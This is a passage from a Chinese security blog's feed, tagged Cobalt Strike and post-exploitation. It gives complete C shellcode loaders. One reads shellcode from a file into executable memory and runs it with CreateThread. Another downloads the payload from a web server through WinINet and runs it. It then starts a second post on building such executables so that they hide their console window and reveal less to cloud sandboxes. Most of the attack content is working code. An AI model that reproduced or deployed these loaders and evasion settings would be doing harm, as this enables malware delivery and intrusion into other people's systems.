重新设置文件指针到起始位置</span></span><br><span class="line"><span class="comment">// 读取内容</span></span><br><span class="line"><span class="type">char</span>* content = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> (!content) &#123;</span><br><span class="line">perror(<span class="string">&quot;Error allocating memory&quot;</span>);</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fread(content, <span class="number">1</span>, size, file);</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line">LPVOID p = VirtualAlloc(<span class="literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">DWORD error = GetLastError();</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error allocating memory. GetLastError: %lu\n&quot;</span>, error);</span><br><span class="line"><span class="built_in">free</span>(content);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 复制 shellcode 进申请的内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(p, content, size);</span><br><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line">HANDLE h = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)p, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (h == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error creating thread\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(content);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 等待线程完成</span></span><br><span class="line">WaitForSingleObject(h, INFINITE);</span><br><span class="line"><span class="comment">// 释放内存</span></span><br><span class="line">VirtualFree(p, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">free</span>(content);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Web分离"><a href="#Web分离" class="headerlink" title="Web分离"></a>Web分离</h3><p>将有效载荷直接存储在二进制文件中.这是⼀种快速且常用的获取有效载荷的方法.不幸的是,在某些情况下,当存在有效载荷大小限制时,将有效载荷保存在代码中并不是⼀种可行的方法.另⼀种方法是将有效载荷托管在 Web 服务器上,并在执行期间获取它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure><h4 id="获取有效负载"><a href="#获取有效负载" class="headerlink" title="获取有效负载"></a>获取有效负载</h4><p>为了从 Web 服务器获取有效负载,将使用以下<code>Windows API</code>：</p><ol><li><p><code>InternetOpenW</code> - 打开互联网会话句柄,这是使用其他<code>Internet Windows API</code> 的先决条件</p></li><li><p><code>InternetOpenUrlW</code>-打开指定资源的句柄,该资源是有效载荷的 URL.</p></li><li><p><code>InternetReadFile</code>-从Web资源句柄读取数据.这是由<code>InternetOpenUrlW</code>打开的句柄</p></li><li><p><code>InternetCloseHandle</code>-关闭句柄.</p></li></ol><h4 id="打开互联网会话"><a href="#打开互联网会话" class="headerlink" title="打开互联网会话"></a>打开互联网会话</h4><p>第⼀步是使用<code>InternetOpenW</code>打开互联网会话句柄,这将初始化应用程序对<code>WinINet</code>函数的使用.传递给<code>WinAPI</code>的所有参数都是NULL.因为它们主要用于代理相关事宜.</p><p>值得注意的是,将第二个参数设置为NULL.相当于使用<code>INTERNET_OPEN_TYPE_PRECONFIG</code>,它指定应使用系统</p><p>的当前配置来确定互联网连接的代理设置.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HINTERNET <span class="title function_">InternetOpenW</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszAgent, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwAccessType, <span class="comment">// NULL or INTERNET_OPEN_TYPE_PRECONFIG</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszProxy, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszProxyBypass, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwFlags <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Opening an internet session handle</span></span><br><span class="line">hInternet = InternetOpenW(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h4 id="打开有效载荷的句柄"><a href="#打开有效载荷的句柄" class="headerlink" title="打开有效载荷的句柄"></a>打开有效载荷的句柄</h4><p>继续使用下⼀个<code>WinAPI</code>,<code>InternetOpenUrlW</code>其中正在建立与有效载荷的 URL 的连接.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HINTERNET <span class="title function_">InternetOpenUrlW</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] HINTERNET hInternet, <span class="comment">// Handle opened by InternetOpenW</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszUrl, <span class="comment">// The payload&#x27;s URL</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszHeaders, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwHeadersLength, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwFlags, <span class="comment">// INTERNET_FLAG_HYPERLINK | INTERNET_FLA</span></span></span><br><span class="line"><span class="params">G_IGNORE_CERT_DATE_INVALID</span></span><br><span class="line"><span class="params"> [in] DWORD_PTR dwContext <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ol><li><strong><code>hInternet</code> [in]</strong>:这是一个句柄,由先前调用 <code>InternetOpenW</code> 函数返回.它表示一个用于整个应用会话的 WinINet 启动句柄.你可以将其视为 WinINet 会话的标识符,用于管理后续的网络请求.</li><li><strong><code>lpszUrl</code> [in]</strong>:这是一个指向宽字符字符串的指针,表示要打开的资源的 URL.URL 指定了你要访问的资源的地址,例如 “<a href="http://www.example.com/">http://www.example.com</a>“.</li><li><strong><code>lpszHeaders</code> [in]</strong>:这是一个指向宽字符字符串的指针,表示要附加到请求中的头部信息.通常为 <code>NULL</code>,表示不需要附加额外的 HTTP 头；如果需要可以传入自定义的 HTTP 头信息.</li><li><strong><code>dwHeadersLength</code> [in]</strong>:指定 <code>lpszHeaders</code> 参数中头信息的长度.如果 <code>lpszHeaders</code> 为 <code>NULL</code>,则该参数也应该为 0.否则,它指定了头信息的字节数.</li><li><strong><code>dwFlags</code> [in]</strong>:指定请求行为的选项标志.常见的标志包括：<ul><li><code>INTERNET_FLAG_HYPERLINK</code>: 表示目标是一个超链接.通常不需要手动设置,由浏览器自动设置.</li><li><code>INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</code>: 忽略因证书的日期无效而导致的错误.</li><li>其他标志可能包括缓存控制标志,如 <code>INTERNET_FLAG_RELOAD</code>(绕过缓存)等.</li></ul></li><li><strong><code>dwContext</code> [in]</strong>:这是一个应用程序定义的值,用于与异步操作关联.通常在同步操作中设置为 <code>NULL</code>.如果使用异步操作,可以用它来标识或跟踪请求.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Opening a handle to the payload&#x27;s URL</span></span><br><span class="line">hInternetFile = InternetOpenUrlW(hInternet, <span class="string">L&quot;http://127.0.0.1:8000/calc.bin&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p><code>InternetReadFile</code>是下⼀个用来读取有效负载的<code>WinAPI</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InternetReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] HINTERNET hFile, <span class="comment">// Handle opened by InternetOpenUrlW</span></span></span><br><span class="line"><span class="params"> [out] LPVOID lpBuffer, <span class="comment">// Buffer to store the payload</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwNumberOfBytesToRead, <span class="comment">// The number of bytes to read</span></span></span><br><span class="line"><span class="params"> [out] LPDWORD lpdwNumberOfBytesRead <span class="comment">// Pointer to a variable that rec</span></span></span><br><span class="line"><span class="params">eives the number of bytes read</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>在调用该函数之前,必须分配⼀个缓冲区来保存有效载荷.因此,<code>LocalAlloc</code>用于分配与有效载荷大小相同的缓冲区,即 272 字节.⼀旦分配了缓冲区,<code>InternetReadFile</code>就可以用来读取有效载荷.该函数需要读取的字节数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pBytes = (PBYTE)LocalAlloc(LPTR, <span class="number">272</span>);</span><br><span class="line">InternetReadFile(hInternetFile, pBytes, <span class="number">272</span>, &amp;dwBytesRead)</span><br></pre></td></tr></table></figure><h4 id="关闭-InterntHandle"><a href="#关闭-InterntHandle" class="headerlink" title="关闭 InterntHandle"></a>关闭 InterntHandle</h4><p><code>InternetCloseHandle</code>用于关闭互联网句柄.成功获取有效负载后应调用此函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InternetCloseHandle</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] HINTERNET hInternet <span class="comment">// Handle opened by InternetOpenW &amp; InternetOpenUrlW</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h4 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Wininet.lib&quot;</span>) <span class="comment">// 链接 WinInet 库,提供网络功能</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从指定 URL 获取有效负载</span></span><br><span class="line">BOOL <span class="title function_">GetPayloadFromUrl</span><span class="params">(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize)</span> &#123;</span><br><span class="line">    <span class="comment">// 状态标志,表示操作是否成功</span></span><br><span class="line">    BOOL bSTATE = TRUE;</span><br><span class="line">    <span class="comment">// 用于存储Internet 连接和文件句柄</span></span><br><span class="line">    HINTERNET hInternet = <span class="literal">NULL</span>, hInternetFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 存储每次读取的字节数</span></span><br><span class="line">    DWORD dwBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 存储总的字节大小</span></span><br><span class="line">    SIZE_T sSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 指向下载数据的指针</span></span><br><span class="line">    PBYTE pBytes = <span class="literal">NULL</span>, pTmpBytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化一个用于互联网访问的会话</span></span><br><span class="line">    hInternet = InternetOpenW(<span class="literal">NULL</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hInternet == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果初始化失败</span></span><br><span class="line">        <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] InternetOpenW Failed With Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="comment">// 设置状态为失败</span></span><br><span class="line">        bSTATE = FALSE;</span><br><span class="line">        <span class="comment">// 跳转到结束标签</span></span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开指定 URL 的文件句柄</span></span><br><span class="line">    hInternetFile = InternetOpenUrlW(hInternet, szUrl, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hInternetFile == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果打开失败</span></span><br><span class="line">        <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] InternetOpenUrlW Failed With Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="comment">// 设置状态为失败</span></span><br><span class="line">        bSTATE = FALSE;</span><br><span class="line">        <span class="comment">// 跳转到结束标签</span></span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为临时缓冲区分配内存</span></span><br><span class="line">    pTmpBytes = (PBYTE)LocalAlloc(LPTR, <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span> (pTmpBytes == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果分配失败</span></span><br><span class="line">        <span class="comment">// 设置状态为失败</span></span><br><span class="line">        bSTATE = FALSE;</span><br><span class="line">        <span class="comment">// 跳转到结束标签</span></span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取数据</span></span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="comment">// 从打开的 URL 读取文件内容</span></span><br><span class="line">        <span class="keyword">if</span> (!InternetReadFile(hInternetFile, pTmpBytes, <span class="number">1024</span>, &amp;dwBytesRead)) &#123;</span><br><span class="line">            <span class="comment">// 输出错误信息</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] InternetReadFile Failed With Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="comment">// 设置状态为失败</span></span><br><span class="line">            bSTATE = FALSE;</span><br><span class="line">            <span class="comment">// 跳转到结束标签</span></span><br><span class="line">            <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新总字节大小</span></span><br><span class="line">        sSize += dwBytesRead;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据是否已经有数据分配新的内存块或调整已有内存块大小</span></span><br><span class="line">        <span class="keyword">if</span> (pBytes == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pBytes == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果内存分配失败</span></span><br><span class="line">            <span class="comment">// 设置状态为失败</span></span><br><span class="line">            bSTATE = FALSE;</span><br><span class="line">            <span class="comment">// 跳转到结束标签</span></span><br><span class="line">            <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将读取的数据复制到总缓冲区中</span></span><br><span class="line">        <span class="built_in">memcpy</span>((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);</span><br><span class="line">        <span class="comment">// 清空临时缓冲区</span></span><br><span class="line">        <span class="built_in">memset</span>(pTmpBytes, <span class="string">&#x27;\0&#x27;</span>, dwBytesRead);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dwBytesRead &lt; <span class="number">1024</span>) &#123; <span class="comment">// 如果读取的字节少于缓冲区大小,说明已到文件末尾</span></span><br><span class="line">            <span class="comment">// 退出读取循环</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将最终的数据和大小返回给调用者</span></span><br><span class="line">    *pPayloadBytes = pBytes;</span><br><span class="line">    *sPayloadSize = sSize;</span><br><span class="line"></span><br><span class="line">_EndOfFunction:</span><br><span class="line">    <span class="keyword">if</span> (hInternetFile) &#123; <span class="comment">// 如果文件句柄有效</span></span><br><span class="line">        <span class="comment">// 关闭文件句柄</span></span><br><span class="line">        InternetCloseHandle(hInternetFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hInternet) &#123; <span class="comment">// 如果 Internet 会话句柄有效</span></span><br><span class="line">        <span class="comment">// 关闭 Internet 会话句柄</span></span><br><span class="line">        InternetCloseHandle(hInternet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pTmpBytes) &#123; <span class="comment">// 如果临时缓冲区指针有效</span></span><br><span class="line">        <span class="comment">// 释放临时缓冲区</span></span><br><span class="line">        LocalFree(pTmpBytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回操作状态</span></span><br><span class="line">    <span class="keyword">return</span> bSTATE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 目标URL,获取数据</span></span><br><span class="line">    LPCWSTR url = <span class="string">L&quot;http://www.example.com/calc.bin&quot;</span>;</span><br><span class="line">    <span class="comment">// 指针用于接收有效负载数据</span></span><br><span class="line">    PBYTE pPayload = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 用于接收有效负载大小</span></span><br><span class="line">    SIZE_T payloadSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数从 URL 获取数据</span></span><br><span class="line">    <span class="keyword">if</span> (GetPayloadFromUrl(url, &amp;pPayload, &amp;payloadSize)) &#123;</span><br><span class="line">        <span class="comment">// 使用 VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">        LPVOID addr = VirtualAlloc(<span class="literal">NULL</span>, payloadSize, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果内存分配失败</span></span><br><span class="line">            <span class="comment">// 退出程序</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 shellcode 拷贝到分配的内存中</span></span><br><span class="line">        <span class="built_in">memcpy</span>(addr, pPayload, payloadSize);</span><br><span class="line">        <span class="comment">// 创建线程执行 shellcode</span></span><br><span class="line">        HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 等待线程执行完成</span></span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        <span class="comment">// 关闭线程句柄</span></span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确保释放分配的内存</span></span><br><span class="line">        <span class="keyword">if</span> (pPayload != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            LocalFree(pPayload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取数据失败信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to retrieve payload.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 程序结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CS-开发环境配置及exe处理</title>
    <link href="https://jiangjiyue.github.io/2024/10/28/ce454855/"/>
    <id>https://jiangjiyue.github.io/2024/10/28/ce454855/</id>
    <published>2024-10-28T08:40:49.000Z</published>
    <updated>2024-11-05T00:31:42.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 7.15K </p>    </div>    <div class="cell" style="">    <p>代码: 1.32K, 文本: 1.76K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 13 分钟</p>    </div>    </div><h2 id="编译器环境配置"><a href="#编译器环境配置" class="headerlink" title="编译器环境配置"></a>编译器环境配置</h2><h3 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h3><p>选中<code>ConsoleApplication1</code>右键—&gt;<code>属性</code></p><h4 id="关闭调试信息"><a href="#关闭调试信息" class="headerlink" title="关闭调试信息"></a>关闭调试信息</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281635057.png" data-fancybox="true"/></div></div><p>属性—&gt;链接器—&gt;调试—&gt;生成调试信息—&gt;否</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281635080.png" data-fancybox="true"/></div></div><h4 id="关闭优化"><a href="#关闭优化" class="headerlink" title="关闭优化"></a>关闭优化</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281635987.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281635283.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281635303.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410291358629.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281635212.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410291358665.png" data-fancybox="true"/></div></div><p>如果不关闭这些信息的话,上传到云沙箱则会泄露很多信息</p><h4 id="隐藏控制台"><a href="#隐藏控制台" class="headerlink" title="隐藏控制台"></a>隐藏控制台</h4><h5 id="属性隐藏"><a href="#属性隐藏" class="headerlink" title="属性隐藏"></a>属性隐藏</h5><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636224.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202410281636121.png" data-fancybox="true"/></div></div><p><code>mainCRTStartup</code></p><h5 id="代码隐藏"><a href="#代码隐藏" class="headerlink" title="代码隐藏"></a>代码隐藏</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; / entry:\&quot;mainCRTStartup\&quot;&quot;</span>)<span class="comment">//不显示窗⼝</span></span></span><br></pre></td></tr></table></figure><h4 id="静态编译"><a href="#静态编译" class="headerlink" 